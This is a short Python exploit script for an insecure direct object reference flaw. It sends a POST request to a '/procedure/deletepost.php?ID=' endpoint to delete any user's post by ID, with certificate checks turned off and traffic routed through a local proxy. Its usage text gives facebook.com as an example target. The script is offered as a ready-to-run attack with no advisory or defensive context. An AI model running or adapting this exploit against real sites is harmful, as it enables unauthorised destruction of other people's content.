import requests
import sys
import urllib3
import html

proxies = {'http':'http://127.0.0.1:8080','https': 'https://127.0.0.1:8080/'} #debug


def printhelp(name):
    print("Delete anyone post by ID:")
    print("[-] Usage: %s <url> <ID>" %name)
    print("""[-] Example: %s "https://www.facebook.com" "102" """ %name)

def exploit_horizontal_access_control(url,ID):
    path = "/procedure/deletepost.php"
    payload = "?ID=%d"%ID
    data = {"submit":"YES"}
    r = requests.post(url+path+payload,data = data, verify=False, proxies = proxies)
    if r.status_code == 200:
        return True
    else:
        return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        ID = int(sys.argv[2].strip())
    except IndexError:
        printhelp(sys.argv[0])
        sys.exit(-1)
    
    if exploit_horizontal_access_control(url,ID):
        print("[+] Post deleted!")
    else:
        print("[+] Post delete failed!")